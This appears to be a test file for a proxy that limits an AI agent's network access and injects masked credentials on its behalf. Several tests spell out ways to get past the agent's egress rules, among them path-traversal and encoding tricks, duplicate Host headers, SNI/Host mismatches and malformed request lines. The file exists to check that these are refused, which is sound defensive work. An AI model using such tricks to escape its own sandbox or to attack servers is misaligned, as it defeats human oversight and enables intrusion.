                                             b"Content-Length: 2\r\nConnection: close\r\n\r\n{}")
        record = next(r for r in proxy.records(until=lambda r: r.get("event") == "http") if r.get("event") == "http")
        # The usage comes from the end of a stream far beyond the logged 64 KiB.
        assert record["model"] == {"model": "claude-opus-5-5", "usage": {"input_tokens": 1500, "output_tokens": 420}}
        assert record["credentials"] == ["x-api-key"] and record["response"]["body"]["truncated"]
    finally:
        proxy.close()
        upstream.shutdown()


def test_ssh_to_an_allowed_tcp_target_is_limited_to_its_port(tmp_path, pki):
    """--allow-tcp IP:PORT opens SSH to that port only; an address merely approved gets none."""
    proxy = Proxy(tmp_path, pki, 9, {"allow": {}, "ssh": {"block": True, "allowed": [], "public_git": [],
                                                          "allowed_tcp": [["203.0.113.5", 22]]}})
    try:
        assert proxy.server.ssh_refused("203.0.113.5", 22) is None
        assert proxy.server.ssh_refused("203.0.113.5", 2222)
        assert proxy.server.ssh_refused("198.51.100.9", 22)
    finally:
        proxy.close()


def test_no_ssh_into_a_range_with_a_public_git_host(tmp_path, pki):
    """--allow 140.82.112.0/20 with github.com pinned at 140.82.121.4: SSH to 140.82.121.35 is refused."""
    proxy = Proxy(tmp_path, pki, 9, {"allow": {}, "ssh": {"block": True, "allowed": ["140.82.112.0/20", "10.0.0.0/8"],
                                                          "public_git": ["140.82.121.4"]}})
    try:
        assert "public Git host" in proxy.server.ssh_refused("140.82.121.35", 22)
        assert proxy.server.ssh_refused("10.1.2.3", 22) is None
    finally:
        proxy.close()


class BigHandler(Handler):
    def do_GET(self):
        body = b"x" * (8 << 20)
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        with contextlib.suppress(OSError):
            self.wfile.write(body)


def test_a_client_closing_early_still_leaves_its_request_in_the_log(tmp_path, pki):
    """The request went out: a client that resets once it has the start of the answer must not erase it."""
    upstream = serve(BigHandler)
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        client = socket.create_connection(("127.0.0.1", proxy.port))
        client.sendall(b"GET /big HTTP/1.1\r\nHost: a\r\n\r\n")
        client.settimeout(10)
        assert client.recv(100).startswith(b"HTTP/1.1 200")
        client.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        client.close()  # reset with most of the body unsent
        is_http = lambda r: r.get("event") == "http"  # noqa: E731
        record = next(r for r in proxy.records(wait=10, until=is_http) if is_http(r))
        assert record["url"].endswith("/big") and record["method"] == "GET"
    finally:
        proxy.close()
        upstream.shutdown()


def test_allow_http_rules_limit_methods_and_paths(tmp_path, pki):
    """Once a host has --allow-http rules, only matching requests reach it; the bare address is no way around."""
    upstream = serve(Handler)
    port = upstream.server_address[1]
    rules = [{"host": "api.example", "methods": ["GET"], "path": "/repos/**", "addresses": ["127.0.0.1"]}]
    proxy = Proxy(tmp_path, pki, port, {"http_rules": rules})
    try:
        assert proxy.server.http_refused("api.example", "GET", "/repos/a/b") is None
        assert "not among the requests allowed" in proxy.server.http_refused("api.example", "POST", "/repos/a/b")
        assert proxy.server.http_refused("api.example", "GET", "/gists")
        assert proxy.server.http_refused("other.example", "POST", "/") is None  # no rules: as before
        # Plain HTTP to the pinned address: refused with a 403 the agent can read, and logged.
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"POST /gists HTTP/1.1\r\nHost: api.example\r\nContent-Length: 2\r\n\r\nhi")
            client.settimeout(10)
            answer = client.recv(1000)
        assert answer.startswith(b"HTTP/1.1 403") and b"--allow-http" in answer
        refused = lambda r: r.get("event") == "denied" and "--allow-http" in r.get("reason", "")  # noqa: E731
        assert any(refused(r) for r in proxy.records(wait=10, until=refused))
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"GET /repos/x HTTP/1.1\r\nHost: api.example\r\nConnection: close\r\n\r\n")
            client.settimeout(10)
            assert client.recv(100).startswith(b"HTTP/1.1 200")
    finally:
        proxy.close()
        upstream.shutdown()


def test_allow_http_cannot_be_bypassed(tmp_path, pki):
    """Bypasses found in review: another name of the same certificate with the API's Host header, dot segments,
    encodings, and a rule pattern whose * crossed path segments."""
    rules = [{"host": "api.example", "methods": ["POST"], "path": "/repos/myorg/*/pulls",
              "addresses": ["192.0.2.21"]}]
    proxy = Proxy(tmp_path, pki, 9, {"http_rules": rules})
    refused = proxy.server.http_refused
    try:
        assert refused("api.example", "POST", "/repos/myorg/app/pulls", "api.example") is None
        # SNI www.example (same certificate), Host api.example: the API's rules apply, and the mismatch is refused.
        assert "differs from the server name" in refused("www.example", "POST", "/gists", "api.example")
        # The connection went to the API's pinned address under another verified name: its rules apply.
        assert refused("www.example", "POST", "/gists", "www.example", address="192.0.2.21")
        # * stays within one segment.
        assert refused("api.example", "POST", "/repos/myorg/a/b/pulls", "api.example")
    finally:
        proxy.close()
    assert rt.normal_path("/repos/myorg/../../gists") == "/gists"
    assert rt.normal_path("/repos/%2e%2e/zen?x=1") == "/zen"
    assert rt.normal_path("//a//b/") == "/a/b" and rt.normal_path("/") == "" and rt.normal_path("/a\\..\\b") == "/b"
    assert rt.path_matches("/repos/**", "/repos/a/b") and not rt.path_matches("/repos/*", "/repos/a/b")
    assert rt.host_name("API.example:443") == "api.example" and rt.host_name("[::1]:8080") == "::1"


def test_semicolon_segments_and_duplicate_hosts(tmp_path, pki):
    """GitHub resolves /x/..;/y as /y; two Host headers are read differently by different servers."""
    assert rt.normal_path("/repos/myorg/x/..;/..;/..;/gists") == "/gists"
    assert rt.normal_path("/o/r.git/git-receive-pack/x/..;") == "/o/r.git/git-receive-pack"
    assert rt.normal_path("/a;jsessionid=1/b") == "/a/b"
    upstream = serve(Handler)
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"GET / HTTP/1.1\r\nHost: a.example\r\nHost: b.example\r\n\r\n")
            client.settimeout(10)
            assert client.recv(100).startswith(b"HTTP/1.1 400")
        two = lambda r: r.get("reason") == "more than one Host header"  # noqa: E731
        assert any(two(r) for r in proxy.records(wait=10, until=two))
    finally:
        proxy.close()
        upstream.shutdown()


@pytest.mark.parametrize("line", [b"GET /repos/o/x#/../../gists HTTP/1.1", b"GET /repos/o/x /gists HTTP/1.1",
                                  b"GET  /x HTTP/1.1", b"GET /x HTTP/2.0"])
def test_malformed_request_lines_are_refused(tmp_path, pki, line, monkeypatch):
    """A fragment or extra spaces in the request line: a lenient server (Go's path.Clean) would run another target.
    On an HTTP port (80, 443) nothing else passes; elsewhere unrecognised protocols are relayed as TCP."""
    upstream = serve(Handler)
    monkeypatch.setattr(rt, "HTTP_PORTS", (upstream.server_address[1],))
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(line + b"\r\nHost: a.example\r\n\r\n")
            client.settimeout(10)
            try:
                answer = client.recv(100)
            except ConnectionResetError:
                answer = b""
            # Refused: a 400, or (not even recognisable as HTTP) the connection closed; never passed on.
            assert answer.startswith(b"HTTP/1.1 400") or answer == b"", answer
    finally:
        proxy.close()
        upstream.shutdown()


def test_a_host_with_rules_gets_only_checked_http_on_any_port(tmp_path, pki):
    """--allow-tcp IP:8080 to a host with --allow-http rules: raw TCP would pass the rules by, so it is refused."""
    upstream = serve(Handler)
    rules = [{"host": "api.example", "methods": ["GET"], "path": "/**", "addresses": ["127.0.0.1"]}]
    proxy = Proxy(tmp_path, pki, upstream.server_address[1], {"http_rules": rules})
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"GET  /x HTTP/1.1\r\nHost: api.example\r\n\r\n")
            client.settimeout(10)
            try:
                answer = client.recv(100)
            except ConnectionResetError:
                answer = b""
        assert not answer.startswith(b"HTTP/1.1 200")
        refused = lambda r: "neither HTTP nor TLS" in r.get("reason", "")  # noqa: E731
        assert any(refused(r) for r in proxy.records(wait=10, until=refused))
    finally:
        proxy.close()
        upstream.shutdown()


# How servers resolve request paths (GitHub, nginx merge_slashes, Go's path.Clean, Tomcat path parameters,
# IIS backslashes and double decoding): normal_path must resolve each one at least as far as the most lenient of
# them, so that --allow-http rules and the push check judge the path that is run.
PATH_QUIRKS = [
    ("/a/./b", "/a/b"), ("/a/%2e/b", "/a/b"), ("/a/%2E%2E/b", "/b"), ("/a/.%2e/b", "/b"), ("/a/%2e./b", "/b"),
    ("/a/..%2f..%2fb", "/b"), ("/a/..%5cb", "/b"), ("/a\\\\..\\\\b", "/b"), ("/a;x=1/../b", "/b"), ("/a/..;/b", "/b"),
    ("/a/..%3b/b", "/b"), ("/a//..//b", "/b"), ("//a///b//", "/a/b"), ("/a/%252e%252e/b", "/b"),
    ("/a/b/.", "/a/b"), ("/a/b/..", "/a"), ("/..", ""), ("/../../etc", "/etc"), ("/a?x=/../b", "/a"),
    ("/repos/o/r.git/git-receive-pack/x/..;", "/repos/o/r.git/git-receive-pack"),
    ("/repos/o/r.git/git-receive-pack;x", "/repos/o/r.git/git-receive-pack"),
]


@pytest.mark.parametrize("target,expected", PATH_QUIRKS)
def test_path_normalisation_corpus(target, expected):
    assert rt.normal_path(target) == expected


class EchoAuthorization(Handler):
    def do_GET(self):
        body = json.dumps({"authorization": self.headers.get("Authorization")}).encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def test_token_proxy_adds_the_token_only_to_git_requests_of_its_server(tmp_path, pki):
    """--token-proxy: the agent's git sends no credentials; the proxy adds them for the token's HTTPS server and
    Git's smart HTTP paths only, and the token never reaches the log."""
    upstream = serve(EchoAuthorization, pki["server"])
    port = upstream.server_address[1]
    tokens = [{"host": "example.test", "port": port, "user": "x-access-token", "token": "tok-SECRET-123"}]
    proxy = Proxy(tmp_path, pki, port, {"git_tokens": tokens})
    expected = base64.b64encode(b"x-access-token:tok-SECRET-123").decode()

    def get(target, extra=b""):
        answer = https_request(proxy.port, pki["ca"], b"GET " + target + b" HTTP/1.1\r\nHost: example.test\r\n" + extra
                               + b"Connection: close\r\n\r\n")
        return json.loads(answer.split(b"\r\n\r\n", 1)[1])["authorization"]
    try:
        assert get(b"/o/r.git/info/refs?service=git-receive-pack") == f"Basic {expected}"
        assert get(b"/o/r.git/info/refs?service=git-upload-pack") == f"Basic {expected}"
        assert get(b"/api/v1/user") is None  # not a Git request: no token for the agent's API calls
        assert get(b"/o/r.git/info/refs") is None  # dumb HTTP: no service
        assert get(b"/o/r.git/info/refs?service=git-receive-pack", b"Authorization: Basic YWdlbnQ6eA==\r\n") == \
            "Basic YWdlbnQ6eA=="  # the agent's own credentials are left alone
        log = proxy.log.read_text()
        assert "tok-SECRET-123" not in log and expected not in log and '"token_added": true' in log
    finally:
        proxy.close()
        upstream.shutdown()
    # Other servers, plain HTTP and other ports get nothing.
    server = rt.ProxyServer.__new__(rt.ProxyServer)
    server.config = {"git_tokens": tokens}
    args = ("GET", "/o/r.git/info/refs", "/o/r.git/info/refs?service=git-upload-pack", [])
    assert server.git_token("https", "evil.test", {"destination": f"127.0.0.1:{port}"}, *args) is None
    assert server.git_token("http", "example.test", {"destination": f"127.0.0.1:{port}"}, *args) is None
    assert server.git_token("https", "example.test", {"destination": "127.0.0.1:1"}, *args) is None
    assert server.git_token("https", f"127.0.0.1:{port}", {"destination": f"127.0.0.1:{port}"}, *args) is None


def plain_request(port, request):
    with socket.create_connection(("127.0.0.1", port), timeout=10) as raw:
        raw.sendall(request)
        data = b""
        while True:
            chunk = raw.recv(65536)
            if not chunk:
                return data
            data += chunk


def test_a_login_for_the_hosts_loopback_reaches_only_that_port_over_plain_http(tmp_path, pki):
    """sandbox-ai git-logins for http://localhost:3080 (a local Gitea): the proxy adds the token to Git's requests
    to that loopback port, which the sandbox reaches only as the host's; not to other paths, ports or servers."""
    upstream = serve(EchoAuthorization)
    port = upstream.server_address[1]
    tokens = [{"host": "localhost", "port": port, "user": "ch", "token": "tok-LOOP-42", "loopback": True}]
    proxy = Proxy(tmp_path, pki, port, {"git_tokens": tokens})
    expected = base64.b64encode(b"ch:tok-LOOP-42").decode()

    def get(target, extra=b""):
        answer = plain_request(proxy.port, b"GET " + target + b" HTTP/1.1\r\nHost: localhost:%d\r\n" % port + extra
                               + b"Connection: close\r\n\r\n")
        return json.loads(answer.split(b"\r\n\r\n", 1)[1])["authorization"]
    try:
        assert get(b"/ch/sandbox-ai.git/info/refs?service=git-receive-pack") == f"Basic {expected}"
        assert get(b"/api/v1/user") is None  # the agent's other requests: nothing
        assert get(b"/ch/r.git/info/refs?service=git-upload-pack", b"Authorization: Basic YTpi\r\n") == "Basic YTpi"
        log = proxy.log.read_text()
        assert "tok-LOOP-42" not in log and expected not in log and '"token_added": true' in log
    finally:
        proxy.close()
        upstream.shutdown()
    server = rt.ProxyServer.__new__(rt.ProxyServer)
    server.config = {"git_tokens": tokens}
    args = ("GET", "/o/r.git/info/refs", "/o/r.git/info/refs?service=git-upload-pack", [])
    # Another port, a non-loopback destination, or HTTPS: a loopback login is not for them.
    assert server.git_token("http", "x", {"destination": f"127.0.0.1:{port + 1}"}, *args) is None
    assert server.git_token("http", "x", {"destination": f"192.0.2.7:{port}"}, *args) is None
    assert server.git_token("https", "localhost", {"destination": f"127.0.0.1:{port}"}, *args) is None
    assert server.git_token("http", "x", {"destination": f"[::1]:{port}"}, *args) is not None
    # An HTTPS login is never sent over plain http.
    server.config = {"git_tokens": [{"host": "git.example.org", "port": 443, "user": "u", "token": "t", "loopback": False}]}
    assert server.git_token("http", "git.example.org", {"destination": "192.0.2.8:443"}, *args) is None


class EchoHeaders(Handler):
    """Answers with the credential headers it got, for GET and POST alike, and keeps them in GOT: an answer to a
    request the proxy added a key to reaches the client with the key masked."""
    got = None

    def answer(self):
        self.rfile.read(int(self.headers.get("Content-Length") or 0))
        EchoHeaders.got = {"path": self.path, "authorization": self.headers.get("Authorization"),
                           "x-api-key": self.headers.get("x-api-key"),
                           "cf": self.headers.get_all("CF-Access-Client-Secret")}
        body = json.dumps(EchoHeaders.got).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = do_POST = answer


LLM_KEY = "sk-llm-SECRET-0123456789abcdef"
PLACEHOLDER = "sandbox-ai-llm-key-placeholder"


def llm_entry(port, **changes):
    return {"name": "gpu", "scheme": "https", "host": "example.test", "port": port, "addresses": ["127.0.0.1"],
            "prefix": "/team", "placeholder": PLACEHOLDER, "key": LLM_KEY,
            "headers": [["CF-Access-Client-Secret", "cf-SECRET-value"]], "ca": None, **changes}


def test_llm_key_is_added_on_the_wire_for_its_endpoint_only(tmp_path, pki):
    """--llm: the agent sends the placeholder; the proxy puts the key in its place (and the header secrets in) only
    for the endpoint's verified name, port and path prefix. Neither the key nor a header secret reaches the log."""
    upstream = serve(EchoHeaders, pki["server"])
    port = upstream.server_address[1]
    proxy = Proxy(tmp_path, pki, port, {"llm": [llm_entry(port)]})

    def send(target, headers=b"", name="example.test", method=b"POST"):
        answer = https_request(proxy.port, pki["ca"], method + b" " + target + b" HTTP/1.1\r\nHost: example.test\r\n"
                               + headers + b"Content-Length: 2\r\nConnection: close\r\n\r\n{}", name=name)
        assert json.loads(answer.split(b"\r\n\r\n", 1)[1])["path"] == target.decode()  # an answer came
        return EchoHeaders.got
    bearer = f"Authorization: Bearer {PLACEHOLDER}\r\n".encode()
    try:
        got = send(b"/team/v1/chat/completions", bearer + b"CF-Access-Client-Secret: from-the-agent\r\n")
        assert got["authorization"] == f"Bearer {LLM_KEY}" and got["cf"] == ["cf-SECRET-value"]
        got = send(b"/team/v1/messages", f"x-api-key: {PLACEHOLDER}\r\n".encode())
        assert got["x-api-key"] == LLM_KEY and got["authorization"] is None  # where the agent put it
        assert send(b"/team/v1/models", method=b"GET")["authorization"] == f"Bearer {LLM_KEY}"  # none sent: added
        own = send(b"/team/v1/models", b"Authorization: Bearer agents-own-key\r\n", method=b"GET")
        assert own["authorization"] == "Bearer agents-own-key"  # the agent's own credentials are left alone
        outside = send(b"/other/v1/chat/completions", bearer)
        assert outside["authorization"] == f"Bearer {PLACEHOLDER}" and outside["cf"] is None  # outside the prefix
        log = proxy.log.read_text()
        assert LLM_KEY not in log and "cf-SECRET-value" not in log and '"llm": "gpu"' in log
    finally:
        proxy.close()
        upstream.shutdown()
    # Another name, plain http to it, another port: nothing is added.
    for scheme, origin, other_port in (("https", "evil.test", port), ("http", f"127.0.0.2:{port}", port),
                                       ("https", "example.test", port + 1)):
        head = b"POST /team/v1/x HTTP/1.1\r\n" + bearer + b"\r\n"
        assert rt.llm_head([llm_entry(port)], scheme, origin, other_port, "/team/v1/x", head) == (head, None)


def test_llm_key_over_plain_http_goes_by_the_pinned_address(tmp_path, pki):
    upstream = serve(EchoHeaders)
    port = upstream.server_address[1]
    proxy = Proxy(tmp_path, pki, port, {"llm": [llm_entry(port, scheme="http", host="10.0.0.5", prefix="")]})
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as sock:
            sock.sendall(b"POST /v1/chat/completions HTTP/1.1\r\nHost: 10.0.0.5\r\nAuthorization: Bearer "
                         + PLACEHOLDER.encode() + b"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            data = b""
            while chunk := sock.recv(65536):
                data += chunk
        assert EchoHeaders.got["authorization"] == f"Bearer {LLM_KEY}"
        assert json.loads(data.split(b"\r\n\r\n", 1)[1])["authorization"] == "Bearer " + "*" * len(LLM_KEY)
        assert LLM_KEY not in proxy.log.read_text()
    finally:
        proxy.close()
        upstream.shutdown()


def test_llm_endpoint_with_its_own_ca(tmp_path, pki):
    """A server signed by its own CA: trusted for the endpoint (name and port) only, not for any other server."""
    upstream = serve(EchoHeaders, pki["server"])
    port = upstream.server_address[1]
    ca = (pki["run"].parent / "upstream-run" / "ca.pem").read_text()
    system = ssl.create_default_context()  # does not know the upstream CA
    for entries, works in (([], False), ([llm_entry(port, ca=ca)], True), ([llm_entry(port + 1, ca=ca)], False),
                           ([llm_entry(port, ca=ca, host="other.test")], False)):
        log = tmp_path / f"c-{len(entries)}-{works}-{entries[0]['port'] if entries else 0}.jsonl"
        fd = os.open(log, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
        server = rt.ProxyServer({"body_limit": 65536, "allow": {"loopback": [port]}, "llm": entries}, fd,
                                run_dir=pki["run"], destination=lambda sock: ("127.0.0.1", port), upstream=system)
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen()
        server.serve([listener])
        try:
            try:
                answer = https_request(listener.getsockname()[1], pki["ca"], b"GET /team/v1/models HTTP/1.1\r\n"
                                       b"Host: example.test\r\nConnection: close\r\n\r\n")
            except (OSError, ssl.SSLError):
                answer = b""  # the proxy refused before the agent's handshake ended
            assert answer.startswith(b"HTTP/1.1 200") == works
            if not works:
                time.sleep(0.2)
                assert "tls-upstream-failed" in log.read_text()
        finally:
            listener.close()
            os.close(fd)
    upstream.shutdown()


def test_api_key_is_added_on_the_wire_for_its_host_only(tmp_path, pki):
    """--api-key: the agent sends the placeholder in a credential header; the proxy puts the key there for the key's
    verified host and port only. The key never reaches the log, not even when the server echoes it (an answer goes
    to the agent as it came: a server that echoes credentials back is one to give no key to)."""
    upstream = serve(EchoHeaders, pki["server"])
    port = upstream.server_address[1]
    key, placeholder = "devto-SECRET-0123456789", "sandbox-ai-api-key-placeholder-DEVTO_API_KEY"
    proxy = Proxy(tmp_path, pki, port, {"api_keys": [{"host": "example.test", "port": port, "name": "DEVTO_API_KEY",
                                                      "placeholder": placeholder, "key": key}]})

    def send(headers, name="example.test"):
        answer = https_request(proxy.port, pki["ca"], b"POST /api/articles HTTP/1.1\r\nHost: example.test\r\n"
                               + headers + b"Content-Length: 2\r\nConnection: close\r\n\r\n{}", name=name)
        assert key.encode() not in answer  # masked on the way back
        return answer, EchoHeaders.got
    try:
        _, got = send(f"X-API-Key: {placeholder}\r\n".encode())
        assert got["x-api-key"] == key and got["authorization"] is None  # where the agent put it, nothing added
        _, got = send(f"Authorization: Bearer {placeholder}\r\n".encode())
        assert got["authorization"] == f"Bearer {key}"
        log = proxy.log.read_text()
        assert key not in log and '"api_keys": ["DEVTO_API_KEY"]' in log
        _, untouched = send(b"Authorization: Bearer agents-own\r\n")
        assert untouched["authorization"] == "Bearer agents-own"
    finally:
        proxy.close()
        upstream.shutdown()


class EchoesCredentials(Handler):
    """A server that echoes the credential it got: in a header and in the body, with a length or chunked (the
    query says which), and notes what reached it."""
    received = []

    def do_GET(self):
        credential = self.headers.get("Authorization") or ""
        EchoesCredentials.received.append((credential, self.headers.get("Accept-Encoding")))
        body = (json.dumps({"you sent": credential}) + " " * 5000 + credential).encode()
        self.send_response(200)
        self.send_header("X-Echo", credential)
        if "chunked" in self.path:
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            for start in range(0, len(body), 7):  # small chunks: the key crosses their ends
                piece = body[start:start + 7]
                self.wfile.write(b"%x\r\n" % len(piece) + piece + b"\r\n")
            self.wfile.write(b"0\r\n\r\n")
        else:
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)


def read_answer(data):
    """(head, body) of one HTTP/1.1 answer, a chunked body decoded."""
    head, _, rest = data.partition(b"\r\n\r\n")
    if b"transfer-encoding: chunked" not in head.lower():
        return head, rest
    body = b""
    while True:
        size, _, rest = rest.partition(b"\r\n")
        size = int(size.split(b";")[0], 16)
        if size == 0:
            return head, body
        body, rest = body + rest[:size], rest[size + 2:]


@pytest.mark.parametrize("framing", ["length", "chunked"])
def test_an_answer_never_gives_the_agent_a_key_the_proxy_added(tmp_path, pki, framing):
    """--api-key and --publish: the proxy asks for an uncompressed answer and masks its own keys in it (header and
    body, also across chunk ends), with stars of the same length, so the framing stays right."""
    EchoesCredentials.received = []
    upstream = serve(EchoesCredentials, pki["server"])
    port = upstream.server_address[1]
    key, placeholder = "registry-SECRET-0123456789abcdef", "sandbox-ai-api-key-placeholder-TOKEN"
    proxy = Proxy(tmp_path, pki, port, {"api_keys": [{"host": "example.test", "port": port, "name": "TOKEN",
                                                      "placeholder": placeholder, "key": key}]})
    try:
        answer = https_request(proxy.port, pki["ca"], f"GET /{framing} HTTP/1.1\r\nHost: example.test\r\n"
                               f"Authorization: Bearer {placeholder}\r\nAccept-Encoding: gzip\r\n"
                               "Connection: close\r\n\r\n".encode())
        head, body = read_answer(answer)
        assert EchoesCredentials.received == [(f"Bearer {key}", "identity")]  # the server got the key, uncompressed
        assert key.encode() not in answer and b"*" * len(key) in head and body.endswith(b"*" * len(key))
        assert len(body) == len(json.dumps({"you sent": f"Bearer {key}"})) + 5000 + len(f"Bearer {key}")
        assert key not in proxy.log.read_text()
    finally:
        proxy.close()
        upstream.shutdown()


def test_an_answer_to_a_request_without_an_added_key_is_left_alone(tmp_path, pki):
    EchoesCredentials.received = []
    upstream = serve(EchoesCredentials, pki["server"])
    port = upstream.server_address[1]
    proxy = Proxy(tmp_path, pki, port, {"api_keys": [{"host": "example.test", "port": port, "name": "TOKEN",
                                                      "placeholder": "sandbox-ai-api-key-placeholder-TOKEN",
                                                      "key": "registry-SECRET-0123456789abcdef"}]})
    try:
        answer = https_request(proxy.port, pki["ca"], b"GET /length HTTP/1.1\r\nHost: example.test\r\n"
                               b"Authorization: Bearer agents-own\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n")
        assert EchoesCredentials.received == [("Bearer agents-own", "gzip")]  # its own choice of encoding stays
        assert answer.endswith(b"Bearer agents-own")
    finally:
        proxy.close()
        upstream.shutdown()


# --- nothing waits for good ------------------------------------------------------------------------


def test_send_all_gives_up_on_a_peer_that_reads_nothing(monkeypatch):
    """A peer that keeps a zero window (never reads) ends the send after the idle time, as a broken connection,
    instead of retrying forever."""
    monkeypatch.setattr(rt, "IDLE_TIMEOUT", 0.3)
    left, right = socket.socketpair()
    left.setblocking(False)
    outcome = []

    def send():
        try:
            rt.send_all(left, b"x" * (8 << 20))
            outcome.append("sent")
        except OSError as exc:
            outcome.append(exc)
    thread = threading.Thread(target=send, daemon=True)
    try:
        started = time.monotonic()
        thread.start()
        thread.join(5)
        assert not thread.is_alive(), "send_all still waits for a peer that reads nothing"
        assert isinstance(outcome[0], socket.timeout) and time.monotonic() - started < 3
    finally:
        right.close()
        thread.join(5)
        left.close()


def no_thread_for(monkeypatch, name, times=1):
    """threading.Thread.start fails as at the sandbox's process limit ("can't start new thread") for the first
    TIMES threads whose target is called NAME."""
    real, left = threading.Thread, [times]

    class Failing(real):
        def start(self):
            if getattr(self._target, "__name__", "") == name and left[0] > 0:
                left[0] -= 1
                raise RuntimeError("can't start new thread")
            return super().start()
    monkeypatch.setattr(threading, "Thread", Failing)


def first_answer(address, family=socket.AF_INET, send=b"", timeout=3):
    """What a client of ADDRESS gets: its first bytes, b"" when it is closed at once, None when nobody answers."""
    with socket.socket(family, socket.SOCK_STREAM) as client:
        client.settimeout(timeout)
        try:
            client.connect(address)
            client.sendall(send)
            return client.recv(4096)
        except ConnectionError:
            return b""
        except OSError:
            return None


def test_a_thread_that_cannot_start_does_not_end_the_proxys_accept_loop(monkeypatch):
    """At the process limit a connection's thread may not start: that connection is closed, the next ones are still
    served (the loop does not end with the listener left open and connections hanging in its backlog)."""
    def handle(client):
        with client:
            client.sendall(b"served")
    no_thread_for(monkeypatch, "handle")
    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen()
    threading.Thread(target=rt.ProxyServer.accept_loop, args=(types.SimpleNamespace(handle=handle), listener),
                     daemon=True).start()
    try:
        assert first_answer(listener.getsockname()) == b""
        assert first_answer(listener.getsockname()) == b"served"
    finally:
        listener.close()


def test_a_thread_that_cannot_start_does_not_end_the_hook_server(monkeypatch):
    no_thread_for(monkeypatch, "answer")
    directory = Path(tempfile.mkdtemp(prefix="hooks-", dir="/tmp"))
    server, stop = rt.HookServer(rt.Ruleset([])), threading.Event()
    thread = threading.Thread(target=server.serve, args=(directory / "decide.sock", stop), daemon=True)
    thread.start()
    try:
        assert server.ready.wait(5)
        path = str(directory / "decide.sock")
        assert first_answer(path, socket.AF_UNIX, b"{}\n") == b""
        answer = first_answer(path, socket.AF_UNIX, b"{}\n")
        assert answer and "decision" in json.loads(answer), answer
    finally:
        stop.set()
        thread.join(5)
        shutil.rmtree(directory, ignore_errors=True)


def test_a_thread_that_cannot_start_does_not_end_the_supervisors_answers(monkeypatch):
    """serve_asks: a question whose thread cannot start is refused at once; the next ones are answered."""
    no_thread_for(monkeypatch, "answer")
    supervisor_end, proxy_end = socket.socketpair()
    threading.Thread(target=rt.serve_asks, args=(supervisor_end, None), daemon=True).start()
    proxy_end.settimeout(5)
    lines = proxy_end.makefile("r")
    try:
        for ident in (1, 2):
            proxy_end.sendall((json.dumps({"id": ident, "kind": "who", "peer": ["127.0.0.1", 1]}) + "\n").encode())
        first, second = json.loads(lines.readline()), json.loads(lines.readline())
        assert first["id"] == 1 and first["decision"] == "deny"
        assert second["id"] == 2 and "process" in second
    finally:
        proxy_end.close()
        supervisor_end.close()


def test_a_supervisor_that_reads_nothing_fails_the_question_instead_of_wedging_the_proxy(monkeypatch):
    """AskChannel sends under its lock: a supervisor that stops reading would hold that lock in sendall for good, and
    with it every connection that asks or looks up its process. A send that cannot go out in time fails its request
    (refused at once); later ones do not wait for the stalled channel again, and once the supervisor reads again the
    channel works (the cut-off line is ended first)."""
    monkeypatch.setattr(rt, "ASK_SEND_SECONDS", 0.3, raising=False)
    supervisor_end, proxy_end = socket.socketpair()
    channel = rt.AskChannel(proxy_end, timeout=30)
    answers = []

    def ask(size):
        answers.append(channel("push", {"message": "x" * size}))
    try:
        for size in (8 << 20, 10):
            started = time.monotonic()
            worker = threading.Thread(target=ask, args=(size,), daemon=True)
            worker.start()
            worker.join(5)
            assert not worker.is_alive(), "the question waits for good"
            assert answers[-1]["decision"] == "deny" and time.monotonic() - started < 3
        # The supervisor reads again: what it gets ends the cut-off line before the next question.
        received = []

        def read():
            with contextlib.suppress(OSError, ValueError):
                for line in supervisor_end.makefile("r", encoding="utf-8"):
                    with contextlib.suppress(ValueError):
                        message = json.loads(line)
                        received.append(message)
                        if message.get("kind") == "who":
                            supervisor_end.sendall((json.dumps({"id": message["id"], "process": {"pid": 7}}) + "\n").encode())
        threading.Thread(target=read, daemon=True).start()
        # A request while the reader still drains the backlog fails at once (the channel does not wait again
        # while stalled); once there is room, one goes through.
        deadline, answer = time.monotonic() + 5, None
        while answer is None and time.monotonic() < deadline:
            answer = channel.request("who", {"peer": ["127.0.0.1", 1]}).result(5)
            if answer is None:
                time.sleep(0.05)
        assert answer is not None
        assert received[-1]["kind"] == "who"
    finally:
        proxy_end.close()
        supervisor_end.close()


def test_a_privacy_check_that_does_not_answer_refuses_the_push_in_time(tmp_path, pki, monkeypatch):
    """check_push waits for the checker under check_lock: a check that does not answer within PUSH_CHECK_SECONDS
    refuses its push (clearly), and the next push is not held either: refused while the checker is still busy, then
    checked as usual once it caught up, with its own answer, never the late answer to the earlier push."""
    monkeypatch.setattr(rt, "PUSH_CHECK_SECONDS", 0.5, raising=False)
    stand_in = tmp_path / "checker.py"
    stand_in.write_text("import json, sys, time\n"
                        "for number, line in enumerate(sys.stdin):\n"
                        "    if number == 0:\n"
                        "        time.sleep(2)\n"
                        "    print(json.dumps({'ok': number > 0, 'message': f'answer {number}'}), flush=True)\n")
    checker = subprocess.Popen([sys.executable, "-I", str(stand_in)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    proxy = Proxy(tmp_path, pki, 1, {"push_check": True}, checker=checker)
    line = b"0" * 40 + b" " + b"1" * 40 + b" refs/heads/main\0report-status\n"
